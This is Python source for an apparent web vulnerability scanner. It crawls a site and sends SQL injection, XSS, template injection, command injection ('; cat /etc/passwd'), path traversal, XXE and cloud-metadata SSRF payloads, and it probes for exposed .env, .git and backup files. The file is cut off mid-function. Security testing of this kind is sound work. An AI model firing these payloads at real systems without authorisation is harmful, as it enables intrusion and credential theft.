
from __future__ import annotations

import re
import ssl
import socket
import time
from collections import deque
from datetime import datetime, timezone
from typing import Any
from urllib.parse import urljoin, urlparse, urlencode, parse_qs, urlunparse

import requests
from bs4 import BeautifulSoup
from requests.exceptions import RequestException

from vapt.utils.helpers import sanitize_target


SQLI_ERROR_PAYLOADS = [
    "'", '"',
    "' OR '1'='1", "' OR 1=1--", '" OR "1"="1',
    "1' ORDER BY 1--", "1' ORDER BY 100--",
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "admin'--", "') OR ('1'='1",
]

SQLI_BLIND_PAYLOADS = [
    ("' AND SLEEP(5)--", 5),
    ("'; WAITFOR DELAY '0:0:5'--", 5),
    ("1' AND SLEEP(5) AND '1'='1", 5),
    ("' OR SLEEP(5)--", 5),
]

SQLI_ERROR_PATTERN = re.compile(
    r"(error in your SQL syntax|you have an error in your sql"
    r"|Warning: mysql_|ORA-[0-9]{4}|SQLSTATE\[|pg_query\(\)"
    r"|PSQLException|SQLiteException|syntax error.*sql"
    r"|Unclosed quotation mark|quoted string not properly terminated)",
    re.IGNORECASE,
)

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "'><script>alert('XSS')</script>",
    '"><script>alert(1)</script>',
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "'-alert(1)-'",
    '";alert(1);//',
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<details/open/ontoggle=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
]

SSTI_PAYLOADS = [
    ("{{7*7}}", "49"),
    ("${7*7}", "49"),
    ("#{7*7}", "49"),
    ("<%= 7*7 %>", "49"),
    ("{{7*'7'}}", "7777777"),
    ("*{7*7}", "49"),
]

OPEN_REDIRECT_PAYLOADS = [
    "https://evil.com", "//evil.com", "///evil.com",
    "/\\evil.com", "%2F%2Fevil.com", "https%3A%2F%2Fevil.com",
    "\thttps://evil.com", "/%0Aevil.com",
]

REDIRECT_PARAMS = [
    "url", "redirect", "redirect_url", "redirectUrl", "next",
    "return", "returnUrl", "return_url", "goto", "dest", "destination",
    "target", "link", "continue", "forward", "rurl", "r",
]

PATH_TRAVERSAL_PAYLOADS = [
    "../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
    "../../../../etc/passwd", "../../../../../etc/passwd",
    "..%2Fetc%2Fpasswd", "..%252Fetc%252Fpasswd",
    "%2e%2e/etc/passwd", "....//....//etc/passwd",
    "..%c0%afetc%c0%afpasswd",
    "../../../windows/system32/drivers/etc/hosts",
]
TRAVERSAL_HIT = re.compile(
    r"(root:.*:0:0:|daemon|nobody|bin:|sbin:|Windows IP Configuration)",
    re.IGNORECASE,
)

SSRF_PAYLOADS = [
    "http://127.0.0.1", "http://localhost",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.100.100.200/latest/meta-data/",
    "http://[::1]", "http://0.0.0.0",
    "dict://127.0.0.1:6379/info", "file:///etc/passwd",
]
SSRF_PARAMS = [
    "url", "redirect", "next", "path", "uri", "src",
    "target", "dest", "destination", "file", "fetch", "load",
    "remote", "resource", "href", "proxy",
]
SSRF_HIT_TERMS = [
    "ami-id", "instance-id", "computemetadata", "root:x:0:0",
    "iam/security-credentials", "latest/meta-data",
]

CMD_PAYLOADS = [
    ("; id", r"uid=\d+"),
    ("| id", r"uid=\d+"),
    ("& id", r"uid=\d+"),
    ("`id`", r"uid=\d+"),
    ("$(id)", r"uid=\d+"),
    ("; whoami", r"(root|www-data|apache|nginx|nobody)"),
    ("; cat /etc/passwd", r"root:.*:0:0:"),
    ("%0a id %0a", r"uid=\d+"),
]

SENSITIVE_FILES = [
    "/.env", "/.env.local", "/.env.production", "/.env.backup",
    "/.git/HEAD", "/.git/config", "/.gitignore",
    "/config.php", "/config.php.bak",
    "/wp-config.php", "/wp-config.php.bak", "/wp-config.php~",
    "/database.yml", "/settings.py", "/local_settings.py",
    "/secrets.yml", "/credentials.json",
    "/backup.sql", "/backup.zip", "/backup.tar.gz", "/db.sql", "/dump.sql",
    "/.DS_Store", "/robots.txt", "/sitemap.xml", "/crossdomain.xml",
    "/phpinfo.php", "/info.php", "/test.php",
    "/admin/", "/administrator/", "/phpmyadmin/", "/adminer.php",
    "/.htpasswd", "/.htaccess", "/server-status", "/server-info",
    "/web.config", "/application.properties",
    "/api/swagger.json", "/api/openapi.json", "/swagger-ui.html",
    "/v2/api-docs", "/actuator", "/actuator/env", "/actuator/health",
    "/actuator/beans", "/actuator/mappings",
    "/debug", "/console", "/_profiler", "/__debug__/", "/trace",
]

SECURITY_HEADERS = {
    "Strict-Transport-Security": ("HSTS missing — HTTP downgrade risk", "medium", 5.3),
    "Content-Security-Policy": ("CSP missing — XSS risk elevated", "medium", 6.1),
    "X-Frame-Options": ("Clickjacking protection missing", "medium", 4.3),
    "X-Content-Type-Options": ("MIME sniffing protection missing", "low", 3.7),
    "Referrer-Policy": ("Referrer-Policy header missing", "low", 3.1),
    "Permissions-Policy": ("Permissions-Policy header missing", "low", 3.1),
}

XXE_PAYLOAD = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>'
    '<root><data>&xxe;</data></root>'
)

TAKEOVER_SERVICES = {
    "github.io": ("GitHub Pages", [
        "there isn't a github pages site here",
        "for root urls (like http://example.com/) you must provide an index.html file",
    ]),
    "herokuapp.com": ("Heroku", [
        "heroku | no such app",
        "no such app",
        "there is no app configured at that hostname",
    ]),
    "s3.amazonaws.com": ("AWS S3", [
        "nosuchbucket", "the specified bucket does not exist",
    ]),
    "azurewebsites.net": ("Azure", [
        "error 404 - web app not found",
        "this azure app service is not available",
    ]),
    "zendesk.com": ("Zendesk", [
        "help center closed",
        "this help center no longer exists",
    ]),
    "shopify.com": ("Shopify", [
        "sorry, this shop is currently unavailable",
        "only one step left",
    ]),
    "fastly.net": ("Fastly", [
        "fastly error: unknown domain",
    ]),
    "netlify.app": ("Netlify", [
        "not found - request id",
    ]),
    "surge.sh": ("Surge", [
        "project not found",
    ]),
    "ghost.io": ("Ghost", [
        "the thing you were looking for is no longer here",
    ]),
    "pantheon.io": ("Pantheon", [
        "the gods are wise",
        "404 unknown site",
    ]),
    "readme.io": ("ReadMe", [
        "project doesnt exist",
    ]),
    "bitbucket.io": ("Bitbucket", [
        "repository not found",
    ]),
    "wordpress.com": ("WordPress", [
        "do you want to register",
    ]),
    "tumblr.com": ("Tumblr", [
        "whatever you were looking for doesn't currently exist at this address",
        "there's nothing here",
    ]),
    "fly.dev": ("Fly.io", [
        "404 not found",
    ]),
    "vercel.app": ("Vercel", [
        "404: not_found",
    ]),
    "unbouncepages.com": ("Unbounce", [
        "the requested url was not found on this server",
    ]),
    "cloudfront.net": ("CloudFront", [
        "bad request", "the request could not be satisfied",
    ]),
}


class WebScanner:

    def __init__(
        self,
        timeout: int = 10,
        max_pages: int = 50,
        safety_config: dict | None = None,
        session=None,
    ) -> None:
        self.timeout = timeout
        self.max_pages = max_pages
        self.safety_config = safety_config or {}
        if session is not None:
            self._raw_session = session
        else:
            self._raw_session = requests.Session()
            self._raw_session.verify = False
            self._raw_session.headers.update({
                "User-Agent": "Mozilla/5.0 (compatible; VAPT-Scanner/2.0; ethical-scan)"
            })
        from vapt.engine.evidence import EvidenceCollector
        self.session = EvidenceCollector(self._raw_session, timeout)


    def run(self, target: str) -> dict[str, Any]:
        target = sanitize_target(target)
        base_url = target if target.startswith(("http://", "https://")) else f"https://{target}"

        results: dict[str, Any] = {
            "target": base_url, "category": "web",
            "pages_crawled": 0, "forms_tested": 0,
            "params_tested": 0, "findings": [],
        }

        try:
            root_resp = self.session.get(base_url, timeout=self.timeout, allow_redirects=True)
        except RequestException as exc:
            results["error"] = str(exc)
            return results

        results["status_code"] = root_resp.status_code
        results["final_url"] = root_resp.url

        results["findings"] += self._check_security_headers(root_resp)
        results["findings"] += self._check_tls(base_url)
        results["findings"] += self._check_ssl_expiry(base_url)
        results["findings"] += self._check_cookies(root_resp)
        results["findings"] += self._check_information_disclosure(root_resp)
        results["findings"] += self._check_csrf(root_resp)
        results["findings"] += self._check_technology_disclosure(root_resp)
        results["findings"] += self._check_cors(base_url)
        results["findings"] += self._check_robots_txt(base_url)

        pages, forms, url_params = self._crawl(base_url)
        results["pages_crawled"] = len(pages)
        results["forms_tested"] = len(forms)
        results["params_tested"] = len(url_params)

        sc = self.safety_config
        results["findings"] += self._attack_url_params(url_params)
        results["findings"] += self._attack_forms(forms, base_url)
        results["findings"] += self._check_sensitive_files(base_url)
        results["findings"] += self._check_directory_listing(pages)
        if not sc.get("skip_ssrf"):
            results["findings"] += self._check_ssrf(base_url)
        if not sc.get("skip_xxe"):
            results["findings"] += self._check_xxe(base_url)
        results["findings"] += self._check_http_methods(pages)
        results["findings"] += self._check_subdomain_takeover(base_url)
        results["findings"] += self._check_open_redirect(base_url)

        seen: set[tuple] = set()
        unique: list[dict] = []
        for f in results["findings"]:
            key = (f.get("vuln_id", ""), f.get("title", ""))
            if key not in seen:
                seen.add(key)
                unique.append(f)
        results["findings"] = unique
        return results


    def _crawl(self, base_url: str) -> tuple[list[str], list[dict], list[str]]:
        origin = urlparse(base_url).netloc
        visited: set[str] = set()
        queue: deque[str] = deque([base_url])
        pages: list[str] = []
        forms: list[dict] = []
        url_params: list[str] = []

        while queue and len(visited) < self.max_pages:
            url = queue.popleft()
            if url in visited:
                continue
            visited.add(url)
            try:
                resp = self.session.get(url, timeout=self.timeout, allow_redirects=True)
            except RequestException:
                continue
            pages.append(url)
            if "text/html" not in resp.headers.get("Content-Type", ""):
                continue
            soup = BeautifulSoup(resp.text, "html.parser")
            for form_tag in soup.find_all("form"):
                action = urljoin(url, form_tag.get("action") or url)
                method = (form_tag.get("method") or "get").lower()
                fields: dict[str, str] = {}
                for inp in form_tag.find_all(["input", "textarea", "select"]):
                    name = inp.get("name")
                    if name:
                        fields[name] = inp.get("value") or "test"
                if fields:
                    forms.append({"action": action, "method": method,
                                  "fields": fields, "page_url": url})
            for tag in soup.find_all(["a", "link"], href=True):
                abs_url = urljoin(url, tag.get("href", ""))
                parsed = urlparse(abs_url)
                if parsed.netloc != origin:
                    continue
                if parsed.query:
                    url_params.append(abs_url)
                clean = urlunparse(parsed._replace(query="", fragment=""))
                if clean not in visited:
                    queue.append(clean)
        return pages, forms, list(set(url_params))


    def _set_param(self, parsed, param_name: str, value: str) -> str:
        qs = parse_qs(parsed.query, keep_blank_values=True)
        qs[param_name] = [value]
        return urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))


    def _attack_url_params(self, param_urls: list[str]) -> list[dict]:
        findings: list[dict] = []
        for url in param_urls:
            parsed = urlparse(url)
            for param_name in parse_qs(parsed.query, keep_blank_values=True):
                findings += self._test_sqli_param(parsed, param_name)
                findings += self._test_xss_param(parsed, param_name)
                findings += self._test_ssti_param(parsed, param_name)
                findings += self._test_traversal_param(parsed, param_name)
                findings += self._test_cmd_param(parsed, param_name)
                if param_name.lower() in REDIRECT_PARAMS:
                    findings += self._test_redirect_param(parsed, param_name)
        return findings

    def _test_sqli_param(self, parsed, param: str) -> list[dict]:
        sc = self.safety_config
        for payload in SQLI_ERROR_PAYLOADS:
            try:
                resp = self.session.get(
                    self._set_param(parsed, param, payload), timeout=self.timeout
                )
                if SQLI_ERROR_PATTERN.search(resp.text):
                    return [self._f(
                        "WEB-001", "sqli",
                        f"SQL Injection (error-based) — param '{param}'",
                        f"DB error triggered at {parsed.path} param={param}",
                        "critical", 9.8,
                        url=self._set_param(parsed, param, payload),
                        parameter=param, payload=payload,
                        evidence=resp.text[:500],
                    )]
            except RequestException:
                pass
        if not sc.get("skip_time_blind_sqli"):
            for payload, delay in SQLI_BLIND_PAYLOADS:
                try:
                    start = time.time()
                    self.session.get(
                        self._set_param(parsed, param, payload),
                        timeout=self.timeout + delay + 2,
                    )
                    if time.time() - start >= delay:
                        return [self._f(
                            "WEB-001", "blind_sqli",
                            f"SQL Injection (time-based blind) — param '{param}'",
                            f"Response delayed by {time.time()-start:.1f}s at {parsed.path} param={param}",
                            "critical", 9.8,
                            url=self._set_param(parsed, param, payload),
                            parameter=param, payload=payload,
                            evidence=f"Response time: {time.time()-start:.1f}s (expected delay: {delay}s)",
                        )]
                except RequestException:
                    pass
        return []

    def _test_xss_param(self, parsed, param: str) -> list[dict]:
        for payload in XSS_PAYLOADS:
            try:
                test_url = self._set_param(parsed, param, payload)
                resp = self.session.get(test_url, timeout=self.timeout)
                if payload in resp.text:
                    return [self._f(
                        "WEB-002", "reflected_xss",
                        f"Reflected XSS — param '{param}'",
                        f"Payload reflected unescaped at {parsed.path} param={param}",
                        "high", 7.4, url=test_url, parameter=param, payload=payload,
                        evidence=f"Payload '{payload}' reflected verbatim in response body",
                    )]
            except RequestException:
                pass
        return []

    def _test_ssti_param(self, parsed, param: str) -> list[dict]:
        for payload, expected in SSTI_PAYLOADS:
            try:
                test_url = self._set_param(parsed, param, payload)
                resp = self.session.get(test_url, timeout=self.timeout)
                if expected in resp.text:
                    return [self._f(
                        "WEB-003", "ssti",
                        f"Server-Side Template Injection (SSTI) — param '{param}'",
                        f"Template {payload!r} evaluated to {expected!r} at {parsed.path}",
                        "critical", 9.0, url=test_url, parameter=param, payload=payload,
                        evidence=f"Payload {payload!r} evaluated to {expected!r} — server-side code execution confirmed",
                    )]
            except RequestException:
                pass
        return []

    def _test_traversal_param(self, parsed, param: str) -> list[dict]:
        for payload in PATH_TRAVERSAL_PAYLOADS:
            try:
                test_url = self._set_param(parsed, param, payload)
                resp = self.session.get(test_url, timeout=self.timeout)
                if TRAVERSAL_HIT.search(resp.text):
                    return [self._f(
                        "WEB-007", "path_traversal",
                        f"Path Traversal — param '{param}'",
                        f"System file content returned at {parsed.path} param={param}",
                        "high", 7.5, url=test_url, parameter=param, payload=payload,
                        evidence=resp.text[:500],
                    )]
            except RequestException:
                pass
        return []

    def _test_cmd_param(self, parsed, param: str) -> list[dict]:
        if self.safety_config.get("skip_command_exec"):
            return []
        for payload, hit_pattern in CMD_PAYLOADS:
            try:
                test_url = self._set_param(parsed, param, payload)
                resp = self.session.get(test_url, timeout=self.timeout)
                if re.search(hit_pattern, resp.text):
                    return [self._f(
                        "WEB-010", "command_injection",
                        f"Command Injection — param '{param}'",
                        f"OS command output at {parsed.path} param={param}",
                        "critical", 9.8, url=test_url, parameter=param, payload=payload,
                        evidence=resp.text[:500],
                    )]
            except RequestException:
                pass
        return []

    def _test_redirect_param(self, parsed, param: str) -> list[dict]:
        for payload in OPEN_REDIRECT_PAYLOADS:
            try:
                test_url = self._set_param(parsed, param, payload)
                resp = self.session.get(test_url, timeout=self.timeout, allow_redirects=False)
                loc = resp.headers.get("Location", "")
                if resp.status_code in (301, 302, 303, 307, 308) and "evil.com" in loc:
                    return [self._f(
                        "WEB-006", "open_redirect",
                        f"Open Redirect — param '{param}'",
                        f"Redirects to {loc} via param {param}",
                        "medium", 6.1, url=test_url, parameter=param, payload=payload,
                        evidence=f"Location: {loc}",
                    )]
            except RequestException:
                pass
        return []


    def _attack_forms(self, forms: list[dict], base_url: str) -> list[dict]:
        findings: list[dict] = []
        for form in forms:
            for field in form["fields"]:
                findings += self._test_form_sqli(form, field)
                findings += self._test_form_xss(form, field)
                findings += self._test_form_ssti(form, field)
                findings += self._test_form_cmd(form, field)
        findings += self._check_csrf_forms(forms)
        return findings

    def _submit(self, form: dict, field: str, value: str):
        data = dict(form["fields"])
        data[field] = value
        try:
            if form["method"] == "post":
                return self.session.post(
                    form["action"], data=data, timeout=self.timeout
                )
            return self.session.get(
                form["action"], params=data, timeout=self.timeout
            )
        except RequestException:
            return None

    def _test_form_sqli(self, form: dict, field: str) -> list[dict]:
        for payload in SQLI_ERROR_PAYLOADS:
            resp = self._submit(form, field, payload)
            if resp and SQLI_ERROR_PATTERN.search(resp.text):
                return [self._f(
                    "WEB-001", "sqli",
                    f"SQL Injection — form field '{field}'",
                    f"DB error at {form['action']} field={field}",
                    "critical", 9.8, url=form["action"], parameter=field, payload=payload,
                    evidence=resp.text[:500],
                )]
        if not self.safety_config.get("skip_time_blind_sqli"):
            for payload, delay in SQLI_BLIND_PAYLOADS:
                start = time.time()
                resp = self._submit(form, field, payload)
                if resp and time.time() - start >= delay:
                    return [self._f(
                        "WEB-001", "blind_sqli",
                        f"SQL Injection (blind) — form field '{field}'",
                        f"Delayed response at {form['action']} field={field}",
                        "critical", 9.8, url=form["action"], parameter=field, payload=payload,
                        evidence=f"Response time: {time.time()-start:.1f}s",
                    )]
        return []

    def _test_form_xss(self, form: dict, field: str) -> list[dict]:
        for payload in XSS_PAYLOADS:
            resp = self._submit(form, field, payload)
            if resp and payload in resp.text:
                return [self._f(
                    "WEB-002", "reflected_xss",
                    f"Reflected XSS — form field '{field}'",
                    f"Payload reflected at {form['action']} field={field}",
                    "high", 7.4, url=form["action"], parameter=field, payload=payload,
                    evidence=f"Payload '{payload}' reflected verbatim in response body",
                )]
        return []

    def _test_form_ssti(self, form: dict, field: str) -> list[dict]:
        for payload, expected in SSTI_PAYLOADS:
            resp = self._submit(form, field, payload)
            if resp and expected in resp.text:
                return [self._f(
                    "WEB-003", "ssti",
                    f"SSTI — form field '{field}'",
                    f"Template evaluated at {form['action']} field={field}",
                    "critical", 9.0, url=form["action"], parameter=field, payload=payload,
                    evidence=f"Payload {payload!r} evaluated to {expected!r}",
                )]
        return []

    def _test_form_cmd(self, form: dict, field: str) -> list[dict]:
        if self.safety_config.get("skip_command_exec"):
            return []
        for payload, hit_pattern in CMD_PAYLOADS:
            resp = self._submit(form, field, payload)
            if resp and re.search(hit_pattern, resp.text):
                return [self._f(
                    "WEB-010", "command_injection",
                    f"Command Injection — form field '{field}'",
                    f"OS command output at {form['action']} field={field}",
                    "critical", 9.8, url=form["action"], parameter=field, payload=payload,
                    evidence=resp.text[:500],
                )]
        return []

    def _check_csrf_forms(self, forms: list[dict]) -> list[dict]:
        csrf_re = re.compile(
            r'<input[^>]*name=["\']?[^"\']*(?:csrf|token|_token|csrfmiddlewaretoken)',
            re.IGNORECASE,
        )
        for form in forms:
            if form["method"] == "post":
                try:
                    resp = self.session.get(form["page_url"], timeout=self.timeout)
                    if not csrf_re.search(resp.text):
                        return [self._f(
                            "WEB-009", "csrf",
                            "POST form missing CSRF token",
                            f"Form at {form['action']} lacks anti-CSRF token",
                            "medium", 6.5,
                        )]
                except RequestException:
                    pass
        return []


    @staticmethod
    def _is_block_or_error_page(body: str, body_len: int) -> bool:
        lower = body.lower()
        if any(p in lower for p in [
            "access denied", "error from cloudfront", "errors.edgesuite.net",
            "checking your browser", "attention required", "please wait while",
            "incapsula", "cloudflare", "just a moment", "reference #",
        ]):
            return True
        if body_len < 2000 and any(p in lower for p in [
            "page not found", "404 not found", "not found",
            "does not exist", "could not be found", "no longer available",
        ]):
            return True
        if any(p in lower for p in [
            "welcome to nginx", "apache2 debian default page", "it works!",
            "iis windows server",
        ]):
            return True
        return False

    def _check_sensitive_files(self, base_url: str) -> list[dict]:
        findings = []
        for path in SENSITIVE_FILES:
            url = base_url.rstrip("/") + path
            try:
                resp = self.session.get(url, timeout=self.timeout, allow_redirects=False)
                if resp.status_code not in (200, 206):
                    continue
                body = resp.text
                body_len = len(resp.content)

                if self._is_block_or_error_page(body, body_len):
                    continue

                if path == "/.env" and not re.search(r"^[A-Z_]+=.+", body, re.MULTILINE):
                    continue
                if "/.env." in path and not re.search(r"^[A-Z_]+=.+", body, re.MULTILINE):
                    continue
                if "/.git/HEAD" in path and "ref:" not in body:
                    continue
                if "/.git/config" in path and "[core]" not in body.lower():
                    continue
                if ".htpasswd" in path and ":" not in body:
                    continue
                if ".htaccess" in path and not any(
                    d in body.lower() for d in ["rewriterule", "deny from", "authtype", "require"]
                ):
                    continue
                if path in ("/server-status", "/server-info") and not any(
                    kw in body.lower() for kw in ["apache server status", "server version", "scoreboard"]
                ):
                    continue
                if "swagger" in path or "openapi" in path or "api-docs" in path:
                    if not any(kw in body.lower() for kw in ['"swagger"', '"openapi"', '"paths"']):
                        continue
                if "actuator" in path:
                    if not any(kw in body.lower() for kw in ['"status"', '"beans"', '"health"', '_links']):
                        continue
                if "phpinfo" in path or path == "/info.php":
                    if "php version" not in body.lower() and "phpinfo()" not in body.lower():
                        continue
                if path.endswith(".sql") or "dump" in path:
                    if not any(kw in body.lower() for kw in ["create table", "insert into", "drop table"]):
                        continue
                if any(ext in path for ext in [".zip", ".tar.gz", ".tgz"]):
                    if body_len < 100 or body.lstrip().startswith("<!"):
                        continue
                if path.rstrip("/") in ("/admin", "/administrator", "/phpmyadmin", "/adminer.php"):
                    if not any(ind in body.lower() for ind in ["<form", "login", "password", "username", "sign in"]):
                        continue
                if body_len < 10:
                    continue

                sev = "critical" if any(
                    p in path for p in
                    [".env", ".git", "config", "sql", "backup", "secret", "credential"]
                ) else "medium"
                findings.append(self._f(
                    "WEB-011", "exposed_file",
                    f"Sensitive file exposed: {path}",
                    f"Accessible at {url} (HTTP {resp.status_code}, {body_len} bytes). Content confirmed as real sensitive data.",
                    sev, 9.1 if sev == "critical" else 5.3, url=url,
                    evidence=f"HTTP {resp.status_code} — {body_len} bytes. Content: {body[:300]}",
                ))
            except RequestException:
                pass
        return findings


    def _check_directory_listing(self, pages: list[str]) -> list[dict]:
        findings = []
        dir_re = re.compile(
            r"(Index of /|<title>Directory listing|Parent Directory</a>|directory listing for)",
            re.IGNORECASE,
        )
        checked: set[str] = set()
        for page_url in pages:
            parsed = urlparse(page_url)
            parts = parsed.path.rstrip("/").rsplit("/", 1)
            dir_path = parts[0] + "/" if len(parts) > 1 else "/"
            dir_url = urlunparse(parsed._replace(path=dir_path, query="", fragment=""))
            if dir_url in checked:
                continue
            checked.add(dir_url)
            try:
                resp = self.session.get(dir_url, timeout=self.timeout)
                if dir_re.search(resp.text):
                    findings.append(self._f(
                        "WEB-012", "directory_listing",
                        f"Directory listing enabled: {dir_path}",
                        f"Server exposes directory index at {dir_url}",
                        "medium", 5.3, url=dir_url,
                        evidence=f"Directory listing response from {dir_url}",
                    ))
            except RequestException:
                pass
        return findings


    def _check_open_redirect(self, base_url: str) -> list[dict]:
        for param in REDIRECT_PARAMS:
            for payload in OPEN_REDIRECT_PAYLOADS[:3]:
                test_url = f"{base_url}/?{param}={requests.utils.quote(payload)}"
                try:
                    resp = self.session.get(test_url, timeout=self.timeout, allow_redirects=False)
                    loc = resp.headers.get("Location", "")
                    if resp.status_code in (301, 302, 303, 307, 308) and "evil.com" in loc:
                        return [self._f(
                            "WEB-006", "open_redirect",
                            f"Open Redirect via '{param}' parameter",
                            f"Server redirects to {loc} when {param}={payload!r}",
                            "medium", 6.1, url=test_url, parameter=param, payload=payload,
                            evidence=f"Location: {loc}",
                        )]
                except RequestException:
                    pass
        return []


    def _check_ssrf(self, base_url: str) -> list[dict]:
        for param in SSRF_PARAMS:
            for internal_url in SSRF_PAYLOADS:
                test_url = f"{base_url}/?{param}={requests.utils.quote(internal_url)}"
                try:
                    resp = self.session.get(test_url, timeout=self.timeout, allow_redirects=False)
                    if any(t in resp.text.lower() for t in SSRF_HIT_TERMS):
                        return [self._f(
                            "WEB-004", "ssrf",
                            f"SSRF via '{param}' parameter",
                            f"Internal content returned when fetching {internal_url} via '{param}'",
                            "high", 8.6, url=test_url, parameter=param, payload=internal_url,
                            evidence=resp.text[:500],
                        )]
                except RequestException:
                    pass
        return []


    def _check_xxe(self, base_url: str) -> list[dict]:
        xml_paths = ["/api/xml", "/upload", "/import", "/parse", "/xmlrpc.php", "/soap"]
        for path in xml_paths:
            url = urljoin(base_url, path)
            try:
                resp = self.session.post(
                    url, data=XXE_PAYLOAD,
                    headers={"Content-Type": "application/xml"},
                    timeout=self.timeout,
                )
                if resp.status_code < 500 and any(m in resp.text for m in ("root:", "xxe")):
                    return [self._f(
                        "WEB-008", "xxe",
                        f"XXE at {path}",
                        f"External entity resolved at {url}. May expose local files.",
                        "high", 7.5, url=url,
                    )]
            except RequestException:
                pass
        return []


    def _check_http_methods(self, pages: list[str]) -> list[dict]:
        findings = []
        for page_url in pages[:10]:
            for method in ("PUT", "DELETE", "PATCH"):
                try:
                    resp = self.session.request(method, page_url, timeout=self.timeout)
                    if resp.status_code in (200, 201, 204):
                        findings.append(self._f(
                            "WEB-015", "security_misconfiguration",
                            f"Dangerous HTTP method {method} allowed",
                            f"{method} {page_url} returned HTTP {resp.status_code}",
                            "high", 7.5, url=page_url,
                            evidence=f"HTTP {method} returned status {resp.status_code}",
                        ))
                except RequestException:
                    pass
        return findings


    def _check_subdomain_takeover(self, base_url: str) -> list[dict]:
        try:
            import dns.resolver
            host = urlparse(base_url).hostname or ""
            answers = dns.resolver.resolve(host, "CNAME")
            for rdata in answers:
                cname = str(rdata.target).rstrip(".")
                for svc_domain, (svc_name, fingerprints) in TAKEOVER_SERVICES.items():
                    if cname.endswith(svc_domain):
                        try:
                            resp = self.session.get(base_url, timeout=self.timeout)
                            body = resp.text.lower()
                            if any(s in body for s in fingerprints):
                                return [self._f(
                                    "WEB-013", "subdomain_takeover",
                                    f"Subdomain takeover possible ({svc_name})",
                                    (
                                        f"CNAME → {cname} ({svc_name}) appears unclaimed. "
                                        f"An attacker can register this service and serve "
                                        f"arbitrary content on {host}."
                                    ),
                                    "critical", 9.3,
                                    evidence=(
                                        f"DNS CNAME: {host} → {cname}\n"
                                        f"Service: {svc_name}\n"
                                        f"HTTP Status: {resp.status_code}\n"
                                        f"Body fingerprint matched\n"
                                        f"Body preview: {resp.text[:300]}"
                                    ),
                                )]
                            if resp.status_code in (404, 410) or len(resp.content) < 100:
                                return [self._f(
                                    "WEB-013", "subdomain_takeover",
                                    f"Possible subdomain takeover ({svc_name}) — verify manually",
                                    (
                                        f"CNAME → {cname} ({svc_name}). "
                                        f"Service returns HTTP {resp.status_code} with minimal content. "
                                        f"May be claimable."
                                    ),
                                    "high", 8.1,
                                    evidence=(
                                        f"DNS CNAME: {host} → {cname}\n"
                                        f"Service: {svc_name}\n"
                                        f"HTTP Status: {resp.status_code}\n"
                                        f"Content-Length: {len(resp.content)}"
                                    ),
                                )]
                        except RequestException:
                            return [self._f(
                                "WEB-013", "subdomain_takeover",
                                f"Likely subdomain takeover ({svc_name}) — connection failed",
                                (
                                    f"CNAME → {cname} ({svc_name}). "
                                    f"Connection failed, suggesting the service is not configured. "
                                    f"High probability of takeover."
                                ),
                                "critical", 9.3,
                                evidence=f"DNS CNAME: {host} → {cname}\nService: {svc_name}\nConnection: FAILED",
                            )]
        except Exception:
            pass
        return []


    def _check_security_headers(self, resp: requests.Response) -> list[dict]:
        findings = []
        for header, (desc, sev, cvss) in SECURITY_HEADERS.items():
            if header not in resp.headers:
                findings.append(self._f(
                    "WEB-005", "security_header",
                    f"Missing security header: {header}", desc, sev, cvss,
                    evidence=f"Missing header: {header}",
                ))
        return findings

    def _check_tls(self, url: str) -> list[dict]:
        parsed = urlparse(url)
        host = parsed.hostname or ""
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        if parsed.scheme != "https":
            return [self._f("NET-002", "tls", "HTTP (unencrypted) endpoint",
                            "Target accessible over plain HTTP.", "high", 7.4)]
        try:
            ctx = ssl.create_default_context()
            with ctx.wrap_socket(
                socket.create_connection((host, port), timeout=self.timeout),
                server_hostname=host,
            ) as s:
                proto = s.version()
            if proto and proto in ("SSLv3", "TLSv1", "TLSv1.1"):
                return [self._f("NET-002", "tls", f"Deprecated TLS: {proto}",
                                "Server supports deprecated TLS.", "high", 7.5)]
        except ssl.SSLCertVerificationError:
            return [self._f("NET-002", "tls", "Invalid/self-signed TLS certificate",
                            "Certificate validation failed.", "medium", 6.1)]
        except Exception:
            pass
        return []

    def _check_ssl_expiry(self, url: str) -> list[dict]:
        parsed = urlparse(url)
        if parsed.scheme != "https":
            return []
        host = parsed.hostname or ""
        port = parsed.port or 443
        try:
            ctx = ssl.create_default_context()
            with ctx.wrap_socket(
                socket.create_connection((host, port), timeout=self.timeout),
                server_hostname=host,
            ) as s:
                cert = s.getpeercert()
            if cert:
                not_after = cert.get("notAfter", "")
                expiry = datetime.strptime(not_after, "%b %d %H:%M:%S %Y %Z").replace(tzinfo=timezone.utc)
                days_left = (expiry - datetime.now(timezone.utc)).days
                if days_left <= 30:
                    sev = "medium" if days_left > 7 else "high"
                    return [self._f("NET-005", "tls",
                                    f"SSL cert expires in {days_left} day(s)",
                                    f"Expires {not_after}", sev,
                                    4.3 if sev == "medium" else 7.0)]
        except Exception:
            pass
        return []

    def _check_cookies(self, resp: requests.Response) -> list[dict]:
        findings = []
        for c in resp.cookies:
            if not c.secure:
                findings.append(self._f(
                    "WEB-016", "insecure_cookie",
                    f"Cookie missing Secure flag: {c.name}",
                    "Cookie may be sent over HTTP.", "medium", 5.0,
                    evidence=f"Cookie '{c.name}' missing Secure flag",
                ))
            if not c.has_nonstandard_attr("HttpOnly"):
                findings.append(self._f(
                    "WEB-016", "insecure_cookie",
                    f"Cookie missing HttpOnly flag: {c.name}",
                    "Cookie accessible via JavaScript — XSS exposure.", "medium", 4.3,
                    evidence=f"Cookie '{c.name}' missing HttpOnly flag",
                ))
        return findings

    def _check_information_disclosure(self, resp: requests.Response) -> list[dict]:
        findings = []
        checks = {
            r"(error in your SQL syntax|Warning: mysql_|ORA-[0-9]{4}|PSQLException)":
                "SQL error leaked in response body",
            r"(stack trace|traceback \(most recent call last\)|exception in thread)":
                "Stack trace leaked in response",
            r"(phpinfo\(\)|PHP Version \d)":
